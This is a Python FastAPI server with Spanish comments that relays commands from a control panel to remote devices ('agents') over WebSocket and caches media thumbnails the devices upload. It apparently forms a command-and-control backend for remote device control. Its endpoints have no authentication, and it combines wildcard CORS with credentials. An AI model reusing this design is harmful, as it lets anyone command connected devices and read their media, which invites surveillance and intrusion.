from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware  # <-- ¡NUEVA IMPORTACIÓN!
from pydantic import BaseModel
import json

app = FastAPI()

# --- ¡NUEVA SECCIÓN DE CONFIGURACIÓN DE SEGURIDAD (CORS)! ---
# Le decimos al servidor que acepte peticiones desde cualquier origen.
# Esto es crucial para que tu panel de control local pueda comunicarse con Render.
origins = ["*"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],  # Permite todos los métodos (GET, POST, etc.)
    allow_headers=["*"],  # Permite todas las cabeceras
)
# --- FIN DE LA NUEVA SECCIÓN ---


# --- Diccionarios en memoria (estos ya estaban bien) ---
connected_agents: dict[str, dict] = {}
device_media_cache: dict[str, list] = {}

class Thumbnail(BaseModel):
    filename: str
    thumbnail_b64: str

# --- Rutas de la API (con más logging para depuración) ---

@app.get("/api/get-agents")
async def get_agents():
    print(f"Panel solicitó la lista. Agentes conectados: {len(connected_agents)}")
    return [agent_data.get("details", {}) for agent_data in connected_agents.values()]

@app.post("/api/send-command")
async def send_command(command: dict):
    target_id = command.get("target_id")
    action = command.get("action", "desconocido")
    print(f"Recibido comando '{action}' para el agente {target_id}")
    if not target_id or target_id not in connected_agents:
        print(f"[ERROR] Agente {target_id} no encontrado.")
        return {"status": "error", "message": "Agente no conectado"}
    try:
        await connected_agents[target_id]["ws"].send_text(json.dumps(command))
        print(f"Comando '{action}' enviado con éxito.")
        return {"status": "success", "message": "Comando enviado"}
    except Exception as e:
        print(f"[ERROR] Fallo al enviar comando: {e}")
        return {"status": "error", "message": f"Fallo al enviar: {e}"}

@app.post("/api/submit_media_list/{device_id}")
async def submit_media_list(device_id: str, media_list: list[Thumbnail]):
    print(f"Recibida lista de medios ({len(media_list)} archivos) del dispositivo {device_id}")
    device_media_cache[device_id] = [item.dict() for item in media_list]
    return {"status": "success"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    print(f"Panel solicitó lista de medios para {device_id}")
    return device_media_cache.get(device_id, [])

# --- WebSocket Endpoint (este ya estaba bien) ---
@app.websocket("/ws/{device_id}/{device_name}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: {device_name} (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "details": {"id": device_id, "name": device_name}}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        name_to_log = connected_agents.get(device_id, {}).get("details", {}).get("name", device_id)
        print(f"[DESCONEXIÓN] Agente desconectado: {name_to_log}")
        if device_id in connected_agents:
            del connected_agents[device_id]
        if device_id in device_media_cache:
            del device_media_cache[device_id]
